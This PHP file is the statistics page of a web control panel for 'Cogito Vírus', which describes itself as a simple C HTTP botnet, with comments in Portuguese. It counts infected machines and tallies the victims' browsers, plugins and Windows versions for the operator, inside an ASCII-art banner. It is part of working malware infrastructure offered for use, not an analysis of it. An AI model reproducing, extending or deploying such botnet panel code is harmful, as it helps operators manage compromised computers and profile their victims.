<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 9045809892834953.php / Estatisticas.php ~~
//    Arquivo responsável por exibir estatísticas e dados de contagem.
//
// Nesta página é exibido as estatísticas do Cogito, Funções adicionadas citadas baixo.
//    * Quantidade de máquinas infectadas.
//    * Quantidade de máquinas que tem navegador X instaldo.
//    * Quantidade de máquinas que tem plugin X instaldo.
//    * Quantidade de máquinas que usa o Windows X.
//    
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	session_start();
	
	include("../modules/extras/global.php");	// Dados globais.
	include("../config.php");					// Configurações.
	include("0923840923949455.php");			// Itens globais do site.
	
	// Verifica login...
	if (!isset($_SESSION["LNG"])) { die($errorPage); }

?>
<html><head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
<title> Cogito V&iacute;rus :: Estat&iacute;sticas</title>
<link rel="shortcut icon" href="<?php echo $faviconGL; ?>" type="image/x-icon" />
<link href="../midia/SiteFL/style.css" rel="stylesheet" type="text/css" />

</head><body>

<center><pre><font style="color: white;"><?php echo $TopoMenu; ?><!-- Exibe topo e menu -->
|                                                                                                                                 |
<?php
/* Exibe numero de máquinas infectadas. */

$Dir = getcwd();

for ($x=0; ; $x++) {
	if ($Dir[$x] == 'h') {
		if ($Dir[$x+1] == 'o') {
			if ($Dir[$x+2] == 'm') {
				if ($Dir[$x+3] == 'e') {
					$Dir[$x]   = 'm'; $Dir[$x+1] = 'a';
					$Dir[$x+2] = 'q'; $Dir[$x+3] = 'u';
					break;
				}
			}
		}
	}
}

if ($Dir[strlen($Dir) - 1] == 'u') {
	$Dir = $Dir . "inas/";
}
$Cont = 0; $Handle = opendir($Dir);

if ($Handle) {
	while (false !== ($File = readdir($Handle))) {
		if ($File != "." && $File != ".." && $File != "index.php" && !(is_dir($Pasta . $File))) {
			$Cont++;
		}
	}
	closedir($Handle);
}

if (strlen($Cont) == 1) { echo "| <font style=\"color: #F28500;\">M&aacute;quinas infectadas:</font> ". $Cont ."                                                                                                          |"; }
if (strlen($Cont) == 2) { echo "| <font style=\"color: #F28500;\">M&aacute;quinas infectadas:</font> ". $Cont ."                                                                                                         |"; }
if (strlen($Cont) == 3) { echo "| <font style=\"color: #F28500;\">M&aacute;quinas infectadas:</font> ". $Cont ."                                                                                                        |"; }
if (strlen($Cont) == 4) { echo "| <font style=\"color: #F28500;\">M&aacute;quinas infectadas:</font> ". $Cont ."                                                                                                       |"; }
if (strlen($Cont) == 5) { echo "| <font style=\"color: #F28500;\">M&aacute;quinas infectadas:</font> ". $Cont ."                                                                                                      |"; }
if (strlen($Cont) == 6) { echo "| <font style=\"color: #F28500;\">M&aacute;quinas infectadas:</font> ". $Cont ."                                                                                                     |"; }
if (strlen($Cont) == 7) { echo "| <font style=\"color: #F28500;\">M&aacute;quinas infectadas:</font> ". $Cont ."                                                                                                    |"; }

?>
<?php 

// Navegadores, verifica Internet Explorer.
$Path = "../modules/estatisticas/NVS/IEX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufA = "";
if ($ValorA == 1) { $BufA = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufA = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufA = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufA = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufA = " ". $Valor ." "; }
if ($ValorA == 6) { $BufA = $Valor ." "; }
if ($ValorA == 7) { $BufA = $Valor; }

// Verifica Mozilla Firefox.
$Path = "../modules/estatisticas/NVS/FFX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufB = "";
if ($ValorA == 1) { $BufB = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufB = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufB = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufB = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufB = " ". $Valor ." "; }
if ($ValorA == 6) { $BufB = $Valor ." "; }
if ($ValorA == 7) { $BufB = $Valor; }

// Verifica Netscape Navigator.
$Path = "../modules/estatisticas/NVS/NSX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufC = "";
if ($ValorA == 1) { $BufC = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufC = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufC = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufC = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufC = " ". $Valor ." "; }
if ($ValorA == 6) { $BufC = $Valor ." "; }
if ($ValorA == 7) { $BufC = $Valor; }

// Verifica Google Chrome.
$Path = "../modules/estatisticas/NVS/CHX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufD = "";
if ($ValorA == 1) { $BufD = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufD = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufD = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufD = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufD = " ". $Valor ." "; }
if ($ValorA == 6) { $BufD = $Valor ." "; }
if ($ValorA == 7) { $BufD = $Valor; }

// Verifica Opera Browser.
$Path = "../modules/estatisticas/NVS/OPX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufE = "";
if ($ValorA == 1) { $BufE = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufE = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufE = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufE = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufE = " ". $Valor ." "; }
if ($ValorA == 6) { $BufE = $Valor ." "; }
if ($ValorA == 7) { $BufE = $Valor; }


// Plugins, verifica plugin CEF.
$Path = "../modules/estatisticas/PLS/CFX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufF = "";
if ($ValorA == 1) { $BufF = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufF = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufF = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufF = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufF = " ". $Valor ." "; }
if ($ValorA == 6) { $BufF = $Valor ." "; }
if ($ValorA == 7) { $BufF = $Valor; }

// Verifica plugin BB
$Path = "../modules/estatisticas/PLS/BXB.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufG = "";
if ($ValorA == 1) { $BufG = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufG = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufG = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufG = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufG = " ". $Valor ." "; }
if ($ValorA == 6) { $BufG = $Valor ." "; }
if ($ValorA == 7) { $BufG = $Valor; }

// Verifica plugin UNI
$Path = "../modules/estatisticas/PLS/UNX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufH = "";
if ($ValorA == 1) { $BufH = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufH = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufH = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufH = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufH = " ". $Valor ." "; }
if ($ValorA == 6) { $BufH = $Valor ." "; }
if ($ValorA == 7) { $BufH = $Valor; }

// Verifica plugin ABN
$Path = "../modules/estatisticas/PLS/ABX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufI = "";
if ($ValorA == 1) { $BufI = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufI = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufI = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufI = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufI = " ". $Valor ." "; }
if ($ValorA == 6) { $BufI = $Valor ." "; }
if ($ValorA == 7) { $BufI = $Valor; }

// Verifica plugin Scopus
$Path = "../modules/estatisticas/PLS/SCX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufJ = "";
if ($ValorA == 1) { $BufJ = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufJ = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufJ = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufJ = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufJ = " ". $Valor ." "; }
if ($ValorA == 6) { $BufJ = $Valor ." "; }
if ($ValorA == 7) { $BufJ = $Valor; }


// Edições do Windows, verifica Windows 7
$Path = "../modules/estatisticas/WNS/WN7.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufL = "";
if ($ValorA == 1) { $BufL = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufL = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufL = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufL = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufL = " ". $Valor ." "; }
if ($ValorA == 6) { $BufL = $Valor ." "; }
if ($ValorA == 7) { $BufL = $Valor; }

// Verifica Windows 8
$Path = "../modules/estatisticas/WNS/WN8.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufK = "";
if ($ValorA == 1) { $BufK = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufK = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufK = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufK = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufK = " ". $Valor ." "; }
if ($ValorA == 6) { $BufK = $Valor ." "; }
if ($ValorA == 7) { $BufK = $Valor; }

// Verifica Windows Vista
$Path = "../modules/estatisticas/WNS/WNV.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufM = "";
if ($ValorA == 1) { $BufM = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufM = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufM = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufM = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufM = " ". $Valor ." "; }
if ($ValorA == 6) { $BufM = $Valor ." "; }
if ($ValorA == 7) { $BufM = $Valor; }

// Verifica Windows XP
$Path = "../modules/estatisticas/WNS/WNXP.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorA = strlen($Valor); $BufN = "";
if ($ValorA == 1) { $BufN = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufN = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufN = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufN = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufN = " ". $Valor ." "; }
if ($ValorA == 6) { $BufN = $Valor ." "; }
if ($ValorA == 7) { $BufN = $Valor; }

// Verifica Outros Windows
$Path = "../modules/estatisticas/WNS/WNS3.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorX = $Valor;
$Path = "../modules/estatisticas/WNS/WNEX.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorX = $ValorX + $Valor;
$Path = "../modules/estatisticas/WNS/WN0.txt"; $Abrir = fopen($Path, "r"); $Valor = fread($Abrir, filesize($Path)); fclose($Abrir);
$ValorX = $ValorX + $Valor; $Valor = $ValorX;

$ValorA = strlen($Valor); $BufO = "";
if ($ValorA == 1) { $BufO = "   ". $Valor ."   "; }
if ($ValorA == 2) { $BufO = "  ". $Valor ."   "; }
if ($ValorA == 3) { $BufO = "  ". $Valor ."  "; }
if ($ValorA == 4) { $BufO = " ". $Valor ."  "; }
if ($ValorA == 5) { $BufO = " ". $Valor ." "; }
if ($ValorA == 6) { $BufO = $Valor ." "; }
if ($ValorA == 7) { $BufO = $Valor; }

?>

|                                                                                                                                 |
| <font style="color: #008000;">       ,--[</font> Navegador's <font style="color: #008000;">]---------------.        ,-[</font> Plugin's <font style="color: #008000;">]--------.        ,--[</font> Sistema's <font style="color: #008000;">]--------------.</font>                 |
| <font style="color: #008000;">       \</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">Internet Explorer</font><font style="color: #00CCFF;">.:</font> <?php echo $BufA;?> <font style="color: #008000;">\       \</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">CEF</font><font style="color: #00CCFF;">....:</font> <?php echo $BufF;?> <font style="color: #008000;">\       \</font>  <font style="color: #00CCFF;">~~</font>  <font style="color: #00FF00;">Windows 8</font><font style="color: #00CCFF;">.....:</font> <?php echo $BufK;?> <font style="color: #008000;">\</font>                |
| <font style="color: #008000;">--------\</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">Mozilla Firefox</font><font style="color: #00CCFF;">...:</font> <?php echo $BufB;?> <font style="color: #008000;">\-------\</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">BB</font><font style="color: #00CCFF;">.....:</font> <?php echo $BufG;?> <font style="color: #008000;">\-------\</font>  <font style="color: #00CCFF;">~~</font>  <font style="color: #00FF00;">Windows 7</font><font style="color: #00CCFF;">.....:</font> <?php echo $BufL;?> <font style="color: #008000;">\-------</font>        |
| <font style="color: #008000;">         \</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">Netscape Navigator</font><font style="color: #00CCFF;">:</font> <?php echo $BufC;?> <font style="color: #008000;">\       \</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">UNI</font><font style="color: #00CCFF;">....:</font> <?php echo $BufH;?> <font style="color: #008000;">\       \</font>  <font style="color: #00CCFF;">~~</font>  <font style="color: #00FF00;">Windows Vista</font><font style="color: #00CCFF;">.:</font> <?php echo $BufM;?> <font style="color: #008000;">\</font>              |
| <font style="color: #008000;">          \</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">Google Chrome</font><font style="color: #00CCFF;">.....:</font> <?php echo $BufD;?> <font style="color: #008000;">\       \</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">ABN</font><font style="color: #00CCFF;">....:</font> <?php echo $BufI;?> <font style="color: #008000;">\       \</font>  <font style="color: #00CCFF;">~~</font>  <font style="color: #00FF00;">Windows XP</font><font style="color: #00CCFF;">....:</font> <?php echo $BufN;?> <font style="color: #008000;">\</font>             |
| <font style="color: #008000;">    -------\</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">Opera Browser</font><font style="color: #00CCFF;">.....:</font> <?php echo $BufE;?> <font style="color: #008000;">\-------\</font>  <font style="color: #00CCFF;">~~</font> <font style="color: #00FF00;">Scopus</font><font style="color: #00CCFF;">.:</font> <?php echo $BufJ;?> <font style="color: #008000;">\-------\</font>  <font style="color: #00CCFF;">~~</font>  <font style="color: #00FF00;">Outros Windows</font><font style="color: #00CCFF;">:</font> <?php echo $BufO;?> <font style="color: #008000;">\--------</font>    |
| <font style="color: #008000;">            `--------------------------------´        `---------------------´        `-----------------------------´</font>            |
|                                                                                                                                 |
|                                                                                                                                 |
|<font style="color: #20FFFF;">~~~                    ~~~~</font>               <font style="color: #33FFCC;">.</font><font style="color: #33FFCC;">`;</font>                                                                                    |
|       <font style="color: #3300CC;">___</font>                                <font style="color: #33FFCC;">'</font>                                 <font style="color: #20FFFF;">~~~~</font>           <font style="color: #999999";><b>.---.</b></font>                                 |
|     <font style="color: #3300CC;">.'   `"-._</font>                          <font style="color: #33FFCC;">'</font>                                                <font style="color: #999999";><b>(   p )</b></font>                  <font style="color: #20FFFF;">~~~~~</font>         |
|    <font style="color: #3300CC;">/ ,        `'-.-.</font>                       <font style="color: #20FFFF;">~~</font><font style="color: #99FF33;">,</font><font style="color: #99FF33;">;</font>                        <font style="color: #20FFFF;">~~  ~~~~</font>           <font style="color: #999999";><b>`---´</b></font>  <font style="color: #20FFFF;">~~~~</font>                           |
|<font style="color: #6D3636;">---</font><font style="color: #3300CC;">/ /`'.       ,' _ \</font>                       <font style="color: #00FF99;">'</font>                                                                           <font style="color: #6D3636;">. ------</font>|
|  <font style="color: #3300CC;">`-'    `-.  ,' ,</font><font style="color: #BCBCBC;">'\</font><font style="color: #3300CC;">\/</font>  <font style="color: #20FFFF;">~~~~</font>                                       <font style="color: #6D3636;">.--------------------------.                       /    .     </font>|
| <font style="color: #6D3636;">|</font>         <font style="color: #3300CC;">\, ,</font><font style="color: #BCBCBC;">'</font>  <font style="color: #FF4242;">ee</font>`-.                                          <font style="color: #6D3636;">/</font>                  <font style="color: #20FFFF;">~~~~~~</font>     <font style="color: #6D3636;">\                  /              </font>|
|        <font style="color: #6D3636;">\</font>   <font style="color: #3300CC;">/ .</font><font style="color: #BCBCBC;">/</font>  ,(_   \      <font style="color: #A05050;">,</font>     <font style="color: #99FF33;">,</font><font style="color: #99FF33;">;</font>           <font style="color: #20FFFF;">~~~~</font>         <font style="color: #6D3636;">/</font>      <font style="color: #20FFFF;">---</font>                         <font style="color: #6D3636;">\             /           /    </font>|
|         <font style="color: #6D3636;">\</font> <font style="color: #3300CC;">(_/</font><font style="color: #BCBCBC;">\\\</font> \__|`--'<font style="color: #6D3636;">\</font>    <font style="color: #A05050;">||</font><font style="color: #20FFFF;">~~</font>  <font style="color: #33FFCC;">'</font>                       <font style="color: #6D3636;">/                              \       \         /      /    /      </font>|
| <font style="color: #20FFFF;">~~~~</font>      <font style="color: #BCBCBC;">///\\|</font>     \    <font style="color: #6D3636;">\</font>   <font style="color: #A05050;">||</font>        <font style="color: #33FFCC;">`</font><font style="color: #33FFCC;">;</font>                <font style="color: #6D3636;">/              /                   \       \      /          /      . </font>|
|           <font style="color: #BCBCBC;">////||</font><font style="color: #6633CC;">-.</font>/`-.}    .--<font style="color: #A05050;">||</font>  <font style="color: #6D3636;">.------------.        /</font>      <font style="color: #20FFFF;">~~~~</font>             <font style="color: #6D3636;">|              \       \   /</font>   <font style="color: #20FFFF;">~~~~~</font>       <font style="color: #6D3636;">.</font>    |
|              <font style="color: #6633CC;">/     `-.__.-</font>`<font style="color: #6633CC;">_</font>.-.<font style="color: #A05050;">|</font> <font style="color: #6D3636;">/    .      \  \     /                         |        \       \</font><font style="color: #999999;">.--------------------------.</font>  |
|<font style="color: #6D3636;">       |      </font><font style="color: #6633CC;">|      '._,-'`|</font>___}<font style="color: #6D3636;">/</font>   <font style="color: #00FF99;">`</font><font style="color: #99FF33;">;</font>   <font style="color: #6D3636;">|         \ /        /      /          |</font>                 <font style="color: #999999;">|</font>       <font style="color: #008000;"><b>COGITO VÍRUS</b></font>       <font style="color: #999999;">|</font>  |
|<font style="color: #6D3636;">       |      </font><font style="color: #6633CC;">/   '.        |</font><font style="color: #6D3636;">/</font> <font style="color: #A05050;">||</font><font style="color: #6D3636;">\</font> <font style="color: #99FF33;">,</font><font style="color: #00FF99;">;</font><font style="color: #33FFCC;">'</font><font style="color: #33FFCC;">`</font>         <font style="color: #6D3636;">\    /        /                  |                 </font><font style="color: #999999;">|</font>                          <font style="color: #999999;">|</font><font style="color: #666666;">--</font>|
|<font style="color: #6D3636;">       |   .--</font><font style="color: #6633CC;">|     '.__,.-`</font>   <font style="color: #A05050;">||</font> <font style="color: #99FF33;">'</font><font style="color: #33FFCC;">:</font><font style="color: #00FF99;">,</font>  <font style="color: #6D3636;">\  |    .----/        /        ,          .            \    </font><font style="color: #999999;">|</font> <font style="color: #d6ef39;">A simple C HTTP Botnet.</font>  <font style="color: #999999;">|</font><font style="color: #666666;">--</font>|
|<font style="color: #6D3636;">   ;   | /</font>    <font style="color: #6633CC;">|       |</font><font style="color: #6D3636;">\   |  /</font><font style="color: #A05050;">||</font> <font style="color: #00FF99;">,</font><font style="color: #99FF33;">;</font><font style="color: #33FFCC;">'</font>        <font style="color: #6D3636;">/     /                                               </font><font style="color: #999999;">|</font>                          <font style="color: #999999;">|</font>  |
|<font style="color: #6D3636;">  ;    /</font>      <font style="color: #6633CC;">/       /</font> <font style="color: #6D3636;">\</font>   <font style="color: #999999;">_,.<font style="color: #A05050;">||</font><font style="color: #0099CC;">oOoO</font>.,_</font>  <font style="color: #6D3636;">./    / /                       \      .                 </font><font style="color: #999999;">'--------------------------'</font>  |
|<font style="color: #6D3636;"> .    /</font>      <font style="color: #6633CC;">|        |</font>  <font style="color: #6D3636;">\</font>  <font style="color: #999999;">\-.<font style="color: #0099CC;">O</font>,<font style="color: #0099CC;">o</font>_<font style="color: #0099CC;">O</font>..-/</font><font style="color: #6D3636;">\/  . /  /                                                 </font>                              |
|<font style="color: #6D3636;">     /</font>      <font style="color: #6633CC;">/         /</font>  <font style="color: #6D3636;"> \</font> <font style="color: #999999;">/          \</font>        <font style="color: #6D3636;">/        ,             ;                     .     </font>                              |
|<font style="color: #666666;">-----------</font><font style="color: #6633CC;">|         /</font><font style="color: #666666;">-----</font><font style="color: #999999;">/            \</font><font style="color: #666666;">-----.----------------------------------------------------------------------------------</font>|
|           <font style="color: #6633CC;">|         |</font>    <font style="color: #999999;">|      ,       |</font>                                                                              <font style="color: green;">_\|/_</font>    |
|        <font style="color: green;">_\|</font><font style="color: #6633CC;">/         |</font>    <font style="color: #999999;">\   ) (     )  /</font>       <font style="color: green;">_\|/_</font>       <font style="color: green;">_\|/_</font>                         <font style="color: green;">_\|/_</font>                                 |
|          <font style="color: #6633CC;">|           \</font>   <font style="color: #FF0000;">,</font><font style="color: #999999;">'.(:, ),: (_.'</font><font style="color: #FF6600;">.</font>                              <font style="color: green;">_\|/_</font>                              <font style="color: green;">_\|/</font> <font style="color: #333333;"><font style="color: #666666;">N</font>etchar <font style="color: #666666;">T</font>eam  /</font>  |
|<font style="color: green;">_\|/_</font>    <font style="color: #6633CC;">/            /</font>'.<font style="color: #FF6600;">'</font> <font style="color: #6D3636;">=</font><font style="color: #FF0000;">"`""</font><font style="color: #6D3636;">=</font><font style="color: #FF0000;">"</font><font style="color: #6D3636;">=</font><font style="color: #FF0000;">"</font><font style="color: #6D3636;">==</font><font style="color: #FF0000;">"</font><font style="color: #6D3636;">=</font> <font style="color: #FF0000;">'.</font>      <font style="color: #333333;">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/</font>   |
|        <font style="color: #6633CC;">`'"---'-.__.'</font>"""`    <font style="color: #FF6600;">`</font> <font style="color: #FF0000;">"" ""</font> <font style="color: #FF6600;">`"</font><font style="color: #FF0000;">"</font>                                                                                         |
|                                                                                                                                 |
|                                                                                                                                 |<?php echo $RodapeCV; ?> <!-- Exibe rodapé -->
</font></pre>


</center></body></html>
<?php
// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
